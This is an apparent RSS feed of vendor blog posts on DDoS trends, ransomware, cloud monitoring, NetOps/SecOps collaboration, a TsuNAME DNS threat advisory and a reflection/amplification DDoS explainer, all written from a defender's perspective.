<p><strong>1. </strong><strong>Security must be part of your corporate culture.</strong></p>

<p>Security and business continuity planning should be ingrained in every enterprise’s corporate culture. This planning should include a cyberattack response plan and other “war-gaming” activities. In addition to creating a rapid response plan, it is advisable to conduct extensive employee training to stand as a line of defense against cyberattacks. Good cybersecurity practices must be reinforced across all functions of every organization. Leadership should set an example, demonstrating a commitment to security that sets a tone for the business.</p>

<p>For some organizations, the chief information security officer (CISO) is increasingly taking on an elevated role such that in some organizations the CISO’s role is on a par with the Chief Information Officer’s (CIO’s) now. Consistent with that the role has tended to become more proactive and more tightly coupled with Business Continuity Planning (BCP) In some companies, the role could become merged along with CIO, BCP and other roles into a unified function of digital process officer or cloud technology officer tasked with greater accountability across the business.</p>

<p>Another important cybersecurity best practice is threat intelligence sharing. Organizations can learn a lot by engaging in sharing within peer industries.</p>

<p><strong>2. </strong><strong>Security at the edge is increasingly important.</strong></p>

<p>As work has largely shifted to remote, many enterprises have come to rely on VPN architectures for connectivity to vital systems and applications. However, the security governing these VPNs may not be sufficient. This has led organizations to substitute their VPN with SD-WAN. Over the past few years, many SD-WAN vendors have integrated security controls into their portfolios. In addition, the emerging secure access service edge (SASE) solutions are unifying network and network security into a single cloud service that provides much-needed connectivity and device security at the edge.</p>

<p><strong>3. </strong><strong>Segmentation and microsegmentation requirements may be emerging. </strong></p>

<p>The HardenStance white paper predicts that in the near future, more-integrated approaches to addressing segmentation of home networks will become prevalent. The paper also anticipates “accelerated investment in vendor roadmaps to meet the segmentation and microsegmentation requirements of all legitimate stakeholders in the data and applications that run on personal devices.”</p>

<p><strong>4. There’s a continuing need to combat ransomware attacks.</strong></p>

<p>As ransomware attacks continue to target enterprises, several industry initiatives are underway to combat this scourge. Security vendors, industry associations, business organizations, and governments are increasingly working together to put measures in place to curtail these attacks. One such measure under consideration is extending Know Your Customer (KYC) transparency rules in financial transactions to include cryptocurrency transactions. These forms of payment are the primary choice of ransomware attackers because they are untraceable, so new KYC rules may act a powerful impediment. Enterprises should strongly support efforts such as these.</p>

  <description>2020 - A year in review: Detailed DDoS attack data for South Korea</description>
  <content:encoded><![CDATA[<p>As the COVID-19 pandemic triggered a massive shift in internet usage, cybercriminals quickly pounced, launching more than 10 million DDoS attacks aimed at crippling targets with a heavy reliance on online services. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed. While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level.

  <title>Increased Online Reliance Opens Door to Cyberattacks </title>
  <link>http://localhost:7996/blog/increased-online-reliance-opens-door-cyberattacks</link>
  <description>In 2020, service providers managed enormous spikes in legitimate network traffic such as streaming video, video conference calls, and gaming while simultaneously defending a huge increase in DDoS attacks targeting critical network infrastructure and services.</description>
  <content:encoded><![CDATA[<p>If 2020 taught the world anything, it was that network connectivity is vital to nearly everything we do. For most businesses, being able to work remotely was a lifesaver, while a world under quarantine turned to network connectivity for streaming entertainment and video conference calling.&nbsp; That vital importance naturally attracted the attention of malicious actors, who always want the things most important to network operators. As a result, service providers had to manage enormous spikes in legitimate network traffic such as streaming video, video conference calls, and gaming while simultaneously defending a commensurate increase in DDoS attacks targeting critical network infrastructure and services.&nbsp; According to <a href="https://www.netscout.com/threatreport">NETSCOUT’s 16th annual Worldwide Infrastructure Security Report (WISR)</a>, 41 percent of service providers were concerned with bandwidth saturation increases from pandemic-staple, over-the-top (OTT) services that became staples of the COVID-19 pandemic, such as streaming video, conference calls, and gaming.</p>

<p>With bandwidth already stretched to the limit, increases in bandwidth-gobbling <a href="https://www.netscout.com/what-is-ddos">distributed-denial-of-service (DDoS</a>) attacks this past year proved to be a severe challenge for providers. WISR, which offers insights from a global survey of network, security, and IT decision-makers across service provider organizations, found 71 percent of providers viewed DDoS attacks targeting critical network infrastructure and services as their top threat in 2020.</p>

<p>Beyond the sheer volume of DDoS attacks, service providers also have also faced increasingly complex attacks.&nbsp; All of this is attributable to Internet of Things (IoT) botnets, <a href="https://www.netscout.com/blog/what-reflection-amplification-ddos-attack">reflection/amplification techniques</a>, and easy-to-use DDoS-for-hire services, which have made attacks more distributed, complex, and potent than ever. This trend was validated by WISR with 57 percent of respondents reporting multivector attacks in 2020.</p>

<p><strong>Attacks Coming from Within and Without</strong></p>

<p>Although inbound DDoS attacks on publicly exposed service infrastructure continues to be a top security priority for service providers, WISR found that 31 percent of respondents were also concerned about an increase in outbound/cross-bound attacks from on-net customers and devices. Cloud services also are presenting new platforms for attacks. The WISR revealed that nearly 40 percent of service providers saw DDoS attacks emanating from inside and outside public cloud services, while nearly three quarters of service providers witnessed botnet traffic originating from both within and outside of their networks.</p>

<p>Mobile devices increasingly are being used to launch attacks on infrastructure, services, and/or customers. The WISR revealed that approximately 25 percent of service providers were being attacked by mobile devices. And making matters worse, nearly half of providers lacked the visibility to tell whether or not mobile devices were being used as the source of attacks. With more than 50 percent of all internet traffic now originating on mobile devices, this lack of visibility presents a serious problem.</p>

<p><strong>Growing Demand for Managed Security Services</strong></p>

<p>As DDoS attacks strike a wider range of targets—partially fueled by easy access to increasingly sophisticated attack tools available as for-hire services—demand for managed security services (MSSPs) has been on the rise. According to WISR data, MSSPs experienced an increase of 69 percent in enterprise demand in 2020, with more than 50 percent reporting increased business from government, cloud/hosting providers, and financial services customers. Meanwhile, 40 percent of MSSPs have seen increased interest from education, ecommerce, and ISPs, while more than 20 percent reported requests from healthcare, media and entertainment, and retail.</p>

<p>Another interesting trend is the rise in the number of MSSPs offering third-party DDoS mitigation services to their customers. The number of MSSPs offering multiple tiers of DDoS protection services have more than tripled year-over-year.</p>

<p><strong>&nbsp;</strong></p>

<p><strong>Fighting Back with Threat Detection Tools </strong></p>

<p>Threat detection tools offer an effective means for neutralizing the threat of DDoS attacks. The WISR revealed that NetFlow-based analyzers were the preferred method, followed by next-generation firewalls, and then by inline DDoS solutions. As many organizations deploy a wide array of threat detection tools, the resulting high number of alerts has made the use of security information and event management (SIEM) platforms all the more important.</p>

  <title>Ensuring Cloud Migration Success</title>
  <link>http://localhost:7996/blog/ensuring-cloud-migration-success</link>
  <description>As enterprises lift and shift applications from on-premises to public cloud platforms, it is critical that users have reliable access and high performance throughout and after the migration.</description>
  <content:encoded><![CDATA[<p>Shifting applications to the cloud has become an increasingly important strategy for businesses looking to improve IT efficiencies while reducing CapEx and OpEx costs. In its recent “Predictions 2021” report, <a href="https://www.crn.com/news/cloud/10-future-cloud-computing-trends-to-watch-in-2021">Forrester Research</a> predicts the global public cloud infrastructure market will grow 35 percent to $120 billion in 2021 as the cloud continues to play a huge role in businesses’ recovery from the COVID-19 pandemic.</p>

<p>But as enterprises begin to lift and shift applications to public cloud platforms, end users must have reliable access and high performance during and after those application migrations. Without adequate service edge visibility, IT can find itself hard-pressed to troubleshoot and resolve issues with an unresponsive application.</p>

<p><strong>This App is Too Slow! </strong></p>

<p>Complaints from unhappy end users may sound like an IT problem, but the problem can have real business impact. For example, imagine a company with employees in branch and regional offices who use an application that is&nbsp;vital to its just-in-time supply chain model. Said company moves that app to the public cloud, and users immediately begin to complain about much slower application performance. As a result, employees are unable to keep up with inbound orders, which has the ripple effect of harming customer service and impinging on revenue due to delayed orders. In the case of this company, cloud application performance issues created significant reputational risks for the business.</p>

<p>Problems such as this are often compounded when troubleshooting tools used by IT provide inconclusive results. In the aforementioned example, the company’s application had a legacy design that was never meant to work over high-latency links. So, when user actions ended up being “chatty”—in other words, involving a high number of individual transactions—latency was introduced, causing the app to become slow or completely unresponsive. Unhappy users put pressure on IT to find the root cause of the problem.</p>

<p><strong>Cloud Monitoring Is Key to Providing Visibility at Service Edges</strong></p>

<p>Enhanced service edge visibility is crucial for IT organizations that are planning to lift and shift legacy applications to the public cloud. Advanced cloud monitoring solutions can be used to analyze application behavior, revealing the effect of additional delays in the time taken to complete multistep end-user tasks.</p>

<p>When business-critical application performance depends on service quality delivered by a public cloud provider that is outside traditional IT control, being able to pinpoint the root cause of latency issues is increasingly vital. Cloud monitoring can enable IT to assess how an application is performing in the cloud, and as result whether the provider is meeting negotiated service level agreements. In the end, service edge visibility will enable IT to assure that performance is acceptable and that end users are kept happy.</p>

  <title>The Beat Goes On</title>
  <link>http://localhost:7996/blog/asert/beat-goes</link>
  <description>The beat goes on: Threat actors launched approximately 2.9 million DDoS attacks in the first quarter of 2021, a 31% increase from the same time in 2020.</description>
  <content:encoded><![CDATA[<h2>Summary</h2>

<p>The <a href="https://www.netscout.com/threatreport/">2H2020 Threat Intelligence Report</a> correctly predicted that 2020’s record-breaking <a href="https://www.netscout.com/what-is-ddos">distributed denial of service (DDoS)</a> attack activity would follow the COVID-19 pandemic into 2021. While we generally love being right, this is not one of those times.<br />
&nbsp;<br />
According to research from NETSCOUT’s ATLAS Security Engineering &amp; Response Team (ASERT), threat actors launched approximately <strong>2.9 million DDoS attacks in the first quarter of 2021, a 31% increase from the same time in 2020</strong>. &nbsp;That’s an extraordinary number in several ways:&nbsp;</p>

<ul>
	<li>If this activity holds, we are on a trajectory that blows right by the unprecedented 10-million attack threshold recorded in 2020.</li>
	<li>The first two months of the year are usually the slowest months in the DDoS attack calendar. This year, we saw 972,000 attacks in January, which eclipses the record set last May for the largest number of attacks yet seen in one month.&nbsp;</li>
	<li>All three months of the first quarter surged over the 900,000-attack mark—just as we were getting used to the new baseline of 800,000 attacks per month.&nbsp;</li>
</ul>

<p>Given those numbers, it seems clear that the “up and to the right” mantra is likely to hold for quite a while yet.&nbsp;</p>

<h2>DDoS Attacks: First Quarter 2021</h2>

<ul>
	<li>Total attacks: 2.9 million</li>
	<li>31% increase year over year</li>
	<li>Max size: 480 Gbps</li>
	<li>Max throughput: 675 Mpps</li>
	<li>Top attack type:&nbsp;
	<ul>
		<li>UDP (this encompasses all 30+&nbsp;UDP Reflection/Amplification DDoS Vectors we track)</li>
	</ul>
	</li>
</ul>

<p>Several other things jumped out from our comparison of the Q1 2021 stats with those of 2020. Attack size remained relatively flat, with no massive terabit attacks observed. Meanwhile, attackers continue to find value in pouring on faster, more difficult-to-mitigate attacks. Adversaries ratcheted up throughput considerably, as the max throughput recorded increased 71% compared with Q1 2020. Attackers also seem to be homing in on a duration sweet spot of five to ten minutes, used by 42% of attacks. Attacks under five minutes dropped from 24% to 19%, while longer-duration attack numbers did not change appreciably.&nbsp;</p>

<p>Finally, we examined activity targeting pandemic lifeline industries such as ecommerce, <a href="https://www.netscout.com/blog/threat-actors-target-remote-learning-during-covid-19">online learning</a>, and healthcare, which all experienced increased attention from malicious actors in 2020. &nbsp;Judging from attack numbers over the past three quarters, these areas largely remain targets, although there are fluctuations.&nbsp;</p>

<h3>Healthcare</h3>

<p>Healthcare organizations experienced about 7,000 attacks in the third quarter of 2020, 10,000 attacks in the fourth quarter, and 8,400 attacks in the first quarter of 2021. That Q1 number represents a 53% increase year over year.</p>

<h3>Education&nbsp;&nbsp;</h3>

<p>We saw a 41% jump in attacks on educational services over the past three quarters: 32,000 attacks from July-September 2020, 39,000 attacks from October-December, and 45,000 attacks in the first quarter of 2021.&nbsp;</p>

<h3>Online services&nbsp;&nbsp;</h3>

<p>Although still high relative to non-pandemic quarterly numbers, activity in Other Information Services (a sector inhabited by companies such as Netflix and Zoom) has declined by 20% over the past three quarters, from 74,000 attacks in the third quarter of 2020 to 59,000 attacks in Q1 2021.&nbsp;</p>

<h2>Conclusion</h2>

<p>As we know, adversaries thrive on constant innovation. Attacks will only grow more complex, and threat actors will continue to discover and weaponize new attack vectors designed to exploit the vulnerabilities exposed by this enormous digital shift. It is imperative that defenders and security professionals remain vigilant to protect the critical infrastructure that connects and enables the modern world.</p>

  <title>A United Front: How NetOps and SecOps Can Improve Security</title>
  <link>http://localhost:7996/blog/netops-secops-improve-security</link>
  <description>Network infrastructure and security concerns are converging. As DDoS, ransomware, and malware attacks continue to proliferate, NetOps and SecOps teams need to work together to ward off cyberattacks.</description>
  <content:encoded><![CDATA[<p>As 2020 didn’t present enough challenges, it also brought an increase in <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS),</a> ransomware, and malware attacks.</p>

<p>And as anyone who has suffered through one or more of these network security incidents can attest, they can have a devastating business impact. Not being able to remotely access mission-critical data and systems, losing the ability to collaborate and connect with colleagues and customers, and disruptions to vital commerce can be a death blow to any organization.</p>

<p>As more and more businesses expand their reliance on network and cloud architectures, this trend also has exposed new risks from cyberattacks. To combat this clear and present danger, network operations (NetOps) and security operations (SecOps) teams need to break out of their respective silos and collaborate to meet this rising threat.</p>

<h3>It Takes Two to Tango</h3>

<p>As networks support an ever-expanding array of applications, devices, and systems, network infrastructure and security concerns are converging. NetOps and SecOps teams have an opportunity to work together to achieve mutually beneficial objectives. With a collaborative effort, they can proactively detect threats, and then investigate and remediate them.</p>

<p>“When NetOps and SecOps use different tools, it slows down collaboration,” explains Eileen Haggerty, assistant vice president of product and solution marketing at NETSCOUT. “Using a single source of truth means they can rectify the situation that much faster.”</p>

<p>By using the same tools, NetOps and SecOps teams gain the advantage of having a unified, holistic view of network performance that streamlines the resolution process. This means that when problems occur, there is less finger-pointing between departments. This in turn allows the teams to save time and identify the source of the threat more quickly, whether in a legacy system or a hybrid cloud environment.</p>

<p>“Network monitoring is the key to maintaining the performance of applications and protecting the business from the myriad threats organizations face each day,” adds Tom Bienkowski, director of product marketing for NETSCOUT. “Having the proper level of visibility across the entire digital infrastructure enables NetOps and SecOps teams to see signs of compromise, which is crucial for rapid response.”</p>

<h3>Save Money by Using a Single Set of Tools</h3>

<p>In a time of constrained IT budgets, using a single set of tools across NetOps and SecOps teams can be not only highly effective, but also efficient and economical.</p>

<p>Haggerty points out that with the increasing complexity of network environments, a growing number of vendors involved, and escalating security incidents, NetOps and SecOps teams should optimize services, working together more efficiently and cost-effectively to reduce the risk of breaches that could jeopardize the network and harm the business.</p>

<p>Armed with the right network monitoring tools, NetOps and SecOps can stay ahead of today’s malicious actors and tomorrow’s threats in an increasingly hostile digital environment.</p>

  <title>TsuNAME Zone Cyclic Dependency-Induced Recursive DNS Query Cascade</title>

<h2>Description</h2>

<p>In mid-May 2021, security researchers at SIDN Labs, InternetNZ, and USC/ISI released a research paper describing a sabotage-based DDoS attack methodology dubbed ‘TsuNAME’ that targeted authoritative DNS server. The researchers posited a rather complex attack scenario that involved the deliberate misconfiguration of NS records in multiple DNS domains registered by the attackers with a targeted authoritative DNS hosting service, such that the NS records for each domain pathologically refer to one another in what is termed a ‘zone cyclic dependency.’. Furthermore, the attackers would also be required to identify and leverage significant numbers of abusable open DNS recursive servers and/or DNS forwarders incapable of detecting and caching responses for cyclical zone dependencies.&nbsp;</p>

<p>Attacker motivations for targeting a particular authoritative DNS hosting service could include rendering a particular domain or set of domains unresolvable, thus constituting a DDoS attack against specific customers of the DNS hosting service; performing direct DDoS extortion of the authoritative DNS hoster in question; etc.</p>

<p>The TsuNAME researchers theorize that once attackers have successfully registered the sabotaged domains and provisioned the poisoned zonefiles on the targeted authoritative DNS hosting service, they can subsequently launch a classic reflected DNS query flood for the NS record of one of the sabotaged domains, thus inducing the previously identified population of abusable open DNS recursors/forwarders to oscillate between the looped NS records and thereby generate endless cascades of recursive DNS queries directed towards the authoritative DNS server(s) in question. The resultant recursive DNS query cascade would constitute a DDoS attack against the targeted authoritative DNS server(s), thus having a negative impact on the availability of the targeted authoritative DNS hosting service.</p>

<p>It should be noted that popular modern recursive DNS server software will detect zone cyclic dependencies in incoming query/response patterns and will therefore cache the looped NS records in order to avoid propagating the induced DNS query flood to the targeted authoritative DNS server(s). As the researchers note in their paper describing the proposed TsuNAME attack methodology, the few recorded instances of this type of pathological DNS query behavior taking place in the wild involved the unhappy conjunction of accidentally misconfigured DNS zonefiles with older versions of common DNS server software and/or the Google DNS public open recursive DNS service. The researchers state that they worked with both the Google DNS and Cisco OpenDNS teams to mitigate the potential for zone cyclic dependency abuse in their respective public services, as well as with a small number of operators running older, abusable versions of DNS server software.</p>

<p>While the researchers who posted the TsuNAME attack methodology did not explicitly call attention to this fact, network operators should be aware that it is possible that embedded DNS forwarders in Internet of Things (IoT) Customer-premises equipment (CPE) devices such as consumer-grade broadband access routers may not have the ability to detect and cache cyclic zone dependencies based upon query/response patterns.</p>

<p>Observed cascading DNS query floods resulting from inadvertent DNS zone cyclic dependency errors in DNS zonefile configurations have ranged from a 200 % to 1,000 % relative increase in observed queries-per-second (qps) directed towards affected authoritative DNS servers. In theory, an attacker could potentially achieve significantly higher attack amplification ratios, assuming that a sufficient number of abusable DNS recursors/forwarders that do not check for zone cyclical dependency querying could be identified and leveraged in an attack.</p>

<h2>Collateral Impact</h2>

<p>In the case of DNS servers that are authoritative for multiple domains, a successful attack against the actual targeted domain may result in unreachability of resources belonging to unaffiliated domains for which the targeted DNS servers are also authoritative. This is especially true for authoritative DNS hosting providers; these organizations constitute a primary potential target pool for TsuNAME DNS DDoS attacks (while noting that the ultimate goal of an attacker might be to negatively impact the availability of end-customer domains and affiliated resources). &nbsp;</p>

<p>The collateral impact of TsuNAME is potentially quite high for organizations whose abusable DNS recursive resolvers/forwarders are leveraged as reflectors in attacks against authoritative DNS servers. Abuse of DNS recursive resolvers/forwarders can result in significant degradation or even a complete outage of recursive DNS query lookups for legitimate users of these systems, thus rendering affected user populations effectively unable to access the Internet.</p>

<h2>Mitigating Factors</h2>

<p>The logistical complexity of implementing and maintaining the necessary infrastructure to launch TsuNAME DNS DDoS attacks represents a potential barrier to widespread adoption of this attack methodology. Zone cyclic dependency detection and caching mechanisms incorporated in modern versions of popular DNS server/forwarding software allow DNS server operators to ameliorate the impact of this DNS DDoS attack methodology on targeted servers.</p>

<p>The risk posted by zone cyclical dependencies has been recognized by the DNS operational community since at least 2004. The above-mentioned detection/caching mechanisms, as well as the promulgation of BCPs for DNS zone canonicalization and sanitization, also serve as barriers to attackers seeking to leverage the TsuNAME DNS DDoS attack methodology.</p>

<h2>Recommended Actions</h2>

<p>Operators of authoritative DNS servers must implement best current practices (BCPs) for zone canonicalization and sanitation prior to enabling name resolution services for newly registered and provisioned zones. They should also audit the zonefiles for all zones for which they are authoritative in order to identify any zone cyclic dependencies. Name resolution services for affected zones must be disabled until remediation is possible. An open-source DNS zonefile auditing tool called CycleHunter has been made available by the TsuNAME researchers to check zonefiles for zone cyclic dependencies.</p>

<p>Operators of DNS recursive servers/forwarders DNS servers should immediately contact the developers of their preferred DNS server/forwarder implementations to determine whether detection and caching of zone cyclic dependencies in query/response patterns have been implemented in deployed versions. If software updates are indicated to leverage such protections, DNS server/forwarder operators must then rapidly test, validate, and deploy updated versions of their preferred DNS server/forwarder implementations incorporating these protections while simultaneously ensuring that situationally appropriate lab testing, pilot deployment, and change-control procedures are utilized throughout the upgrade process. If developers of a deployed DNS server/forwarder implementation are unable or unwilling to provide updated versions that incorporate the relevant detection and caching mechanisms, it is highly recommended that organizations migrate to alternative implementations that include these protections after following the testing, validation, piloting, and change-control process described above.</p>

<p>DNS forwarders present in IoT CPE devices such as consumer-grade broadband access routers must also be tested, remediated, and/or replaced per the above if they do not incorporate the relevant detection and caching mechanisms to prevent their abuse in TsuNAME DNS DDoS attacks.</p>

<p>All relevant DNS architectural and operational BCPs should be implemented by DNS server operators.</p>

<p>DNS authoritative server operators who suspect that their DNS servers are under a TsuNAME DNS DDoS attack should make use of standard DNS query- and response-analysis techniques, including packet capture, DNS server log analysis, et. al., to identify TsuNAME-style zone cyclic dependency queries oscillating between specific domain(s). &nbsp;</p>

<p>Organizations with business-critical public-facing internet properties should ensure that all relevant network infrastructure, architectural and operational BCPs have been implemented, including situationally specific network access policies that only permit internet traffic via required IP protocols and ports. Internet access network traffic from internal organizational personnel should be deconflated from internet traffic to/from public-facing internet properties and served via separate upstream internet transit links. &nbsp;</p>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situationally appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. Organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack and are included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing Web servers were adequately protected, but authoritative and/or recursive DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks/resources.&nbsp;</p>

  <title>Healthcare Sector: An Enticing Target for Cyberattackers</title>
  <link>http://localhost:7996/blog/cyberattackers-target-healthcare</link>
  <description>Digital transformation in the healthcare industry has presented healthcare providers with a new set of challenges in protecting patients' records and avoiding major service disruptions. But prescrip-tions are out there.</description>
  <content:encoded><![CDATA[<p>Cybercriminals are the ultimate opportunists—if it is important to you, it is important to them. With that in mind, it’s easy to understand why cyberattacks have risen in the healthcare sector over the past year. As the most recent <a href="https://www.netscout.com/threatreport">NETSCOUT Threat Intelligence Report</a> noted, vital pandemic industries such as healthcare experienced increased attention from malicious actors, while the global&nbsp;Lazarus Bear Armada (LBA) <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> extortion campaign&nbsp;that began in September 2020 expanded to include healthcare providers.&nbsp;Several factors contribute to making healthcare facilities vulnerable to cyberattack, but the main factor is lack of expertise in IT security.</p>

<p>The digital transformation that has happened in the healthcare industry over the last 10 years has been nothing short of remarkable. However, with this new digital world comes complexity and risk, leaving healthcare providers in an alarming position to cope with a new set of challenges.</p>

<p><strong>Healthcare Network Vulnerabilities</strong></p>

<p>In the healthcare industry, most investments are made in medical equipment and technology, not in cybersecurity solutions. Moreover, the emphasis in hiring is placed on doctors, nurses, and researchers, not on cybersecurity experts. Many healthcare organizations (especially smaller hospitals) do not have staff and often lack the resources to proactively address cybersecurity. Unpatched versions of Microsoft Windows vulnerable to compromise may exist in these healthcare facilities, for example. Basic cybersecurity knowledge and hygiene such as knowing how to recognize phishing emails, not clicking on unknown malicious URLs, updating passwords on a regular basis, continuously backing up systems, and encrypting confidential data fall by the wayside, posing major risks to these organizations.</p>

<p><strong>Healthcare Is the New Sweet Spot for Bad Actors</strong></p>

<p>Bad actors keep refining their approaches to cyberattacks at a rapid rate, making it challenging for healthcare IT to get ahead of types and approaches of new attacks. For one, the value of medical records is growing on the black market. According to <a href="https://www.experian.com/blogs/ask-experian/heres-how-much-your-personal-information-is-selling-for-on-the-dark-web/">Experian</a>, a provider of information services, a single patient health record could sell for around $1,000. These records include social security numbers, medications, and credit card information, making large-scale attacks worth millions.</p>

<p>Secondly, DDoS and ransomware attacks against healthcare organizations are a common occurrence. Launching a DDoS attack has never been easier: The availability of DIY attack tools or very inexpensive (i.e., $5/hour) DDoS-for-hire services enables anyone to execute an attack. On the ransomware side, interested parties can easily access affiliate programs to buy multiple ransomware malware families, each with publicly available source code. There is even an ample supply&nbsp;of online tutorials and how-to guides to teach the bad actors how to use these&nbsp;new purchases. Both DDoS and ransomware attackers are motivated by money and prey on unprepared targets. That is, ransomware attackers are hoping their victim does not have proper data backup/restoration or network segmentation plans in place, whereas DDoS attackers rely on the victim’s lack of adequate DDoS protection.</p>

<p><strong>Remedy:</strong><strong> Visibility for Proper Cybersecurity</strong></p>

<p>Security and IT operations teams must work together and share solutions to support the organization’s network performance and security efforts. The teams work best when they rely on a common set data derived from a comprehensive monitoring platform. This type of shared architecture also promotes increased collaboration between security and operations teams, thus ensuring a stronger security posture. It also leads to greater cost savings and operational efficiencies, especially welcome in healthcare organizations with lean IT departments. Most importantly, however, it provides a vital multidimensional architectural concept of visibility that combines comprehensive internal/local network visibility with external/global threat intelligence.</p>

<p><strong>The first dimension of visibility is breadth</strong>. This encompasses the entire network and the entire globe—including hybrid cloud environments and providing visibility into traffic traversing both north-south and east-west directions. The ability to visualize end-to-end conversations within or across hybrid cloud environments is one of the biggest challenges healthcare organizations face today. Visibility is the foundation for comprehensive and effective network and application performance analysis and cybersecurity. Without it, network teams run the risk of not knowing what’s causing network or application slowdowns or failure. Security teams run the risk of missing cyberthreats that can severely impact the organization.</p>

<p><strong>The next dimension in visibility is depth</strong>. Deriving key metadata and ultimately packets from the monitored network traffic provides a level of context and insight that can inform network performance and/or security use cases. The volume and variety of this data can prove overwhelming though. Generating a higher, more valuable level of data that provides greater insight is a critical step.</p>

<p>This depth of data provides better insight into issues and helps network and security teams determine whether or not they are seeing something about which they should be concerned. For instance, if they notice a critical database server is receiving messages from a location that should not be communicating with it, or if they notice an increasing number of error messages or slowdowns in communication to the back end, then that needs to be closely monitored.</p>

<p><strong>Use Case: SecOps Teams Collaborate with NetOps Team </strong></p>

<p>How does this look in real life? At one healthcare organization, the NetOps and SecOps teams used a data center transformation project to move from siloed operations with separate tools to a comprehensive visibility platform.</p>

<p>The organization was in the midst of a data center transformation project during which it was migrating select high-definition imaging workloads to a virtual cloud-based environment. DevOps worked closely with NetOps to ensure they had the means to provide end-to-end visibility into these applications and ensure proper performance. Although the SecOps team had their own budget for cybersecurity tools, they chose to leverage the same network management solutions being used by DevOps and NetOps to secure the digital transformation. They are now formalizing playbooks between all departments to use a common set of network-visibility and smart-data solutions for threat investigation purposes.</p>

<p><strong>Digital Infrastructure: An Essential Healthcare Worker </strong></p>

<p>Today’s healthcare environments are complex; Workers access patient-care applications via countless medical applications that operate across private and public cloud, software as a service, and Wi-Fi, using countless medical devices. This makes troubleshooting network disruptions both challenging and time consuming. However, the grim reality is that any delays in access to healthcare information, from appointments to live diagnostic data, can negatively impact patients’ care and could even cost lives. In fact, even scheduled downtime poses major risks for healthcare organizations, so it’s no surprise the issue is amplified when an application error or attack does occur. To minimize the impact of ransomware attacks, healthcare organizations need to have adequate data backup, network segmentation, and recovery programs. To avoid DDoS extortion, an adequate DDoS protection plan is necessary. Finally, healthcare organizations also need to optimize small network and security teams by using a common set of data and playbooks for performance and security purposes.</p>

  <title>India Under Attack</title>
  <link>http://localhost:7996/blog/india-under-attack</link>
  <description>2020: A year in review: Detailed DDoS attack data for India</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of <a href="https://www.netscout.com/what-is-ddos" target="_blank">distributed denial-of-service (DDoS)</a> attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the global move to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>Although that unprecedented activity was reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our weekly series focuses on DDoS activity in specific countries. This week: <a href="https://www.netscout.com/sites/default/files/2021-04/SECR_033_EN-2101-TR2H2020_APAC_India.pdf">India.</a></p>

  <title>What Is a Reflection/Amplification DDoS Attack?</title>
  <link>http://localhost:7996/blog/what-reflection-amplification-ddos-attack</link>
  <description>Like all DDoS attacks, reflection/amplification attacks are designed to overwhelm the targeted systems, causing disruption or out-and-out shutdown of services.</description>
  <content:encoded><![CDATA[<p>The COVID-19 pandemic has caused many organizations to accelerate digital transformation efforts in response to an exploding need for remote connectivity. But this trend also has opened the door to a greater threat from hackers and cybercriminals. In particular, <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS) attack</a><u>s </u>have risen dramatically. The latest NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a> revealed record-breaking DDoS activity in 2020, as attackers launched more than 10 million DDoS worldwide.</p>

<p>DDoS attackers have targeted a multitude of industries with the goal of taking critical systems offline to cause maximum disruption. These threats have put security professionals on notice, forcing them to reexamine strategies for keeping networks secure and systems protected.&nbsp;</p>

<p><strong>Reflection/Amplification 101</strong></p>

<p>One of the more popular DDoS attack types being employed today is the reflection/amplification attack, which enables attackers to generate higher-volume attacks by combining two methods:</p>

<ul>
	<li><strong>In reflection attacks,</strong> adversaries spoof a target’s IP address and send a request for information, primarily using the User Datagram Protocol (UDP), or in some cases the Transmission Control Protocol (TCP). The server then responds to the request, sending an answer to the target’s IP address. This “reflection”—using the same protocol in both directions—is why this is called a reflection attack. Any server operating UDP- or TCP-based services can be targeted as a reflector.</li>
	<li><strong>Amplification attacks</strong> generate a high volume of packets that are used to overwhelm the target website without alerting the intermediary. This occurs when a vulnerable service responds with a large reply when the attacker sends his request, often called the trigger packet. Using readily available tools, the attacker can send many thousands of these requests to vulnerable services, thereby causing responses that are considerably larger than the original request and significantly amplifying the size and bandwidth issued to the target. The amplification can include multiple response packets to a single packet, or larger packet sizes than the original. Either method results in amplification.</li>
	<li><strong>A reflection/amplification attack</strong> combines the two, enabling attackers to both magnify the amount of malicious traffic they can generate and obscure the sources of the attack traffic. The most prevalent forms of these attacks rely on millions of exposed DNS, NTP, SNMP, SSDP, and other UDP/TCP-based services.&nbsp;</li>
</ul>

<p>Like all DDoS attacks, reflection/amplification attacks are designed to overwhelm the targeted systems, causing disruption or out-and-out shutdown of services.&nbsp;</p>

<p>What makes this type of attack so dangerous is that the servers/devices used for these types of attacks can be ordinary servers or consumer devices with no clear sign of having been compromised, making it difficult to prevent them. Also, launching a reflection/amplification attack doesn’t require sophisticated tools, which means attackers can create enormous volumetric attacks by using a modest source of bots or a single robust server.&nbsp;</p>

<p><strong>The Best Defense Is a Good Defense</strong>&nbsp;</p>

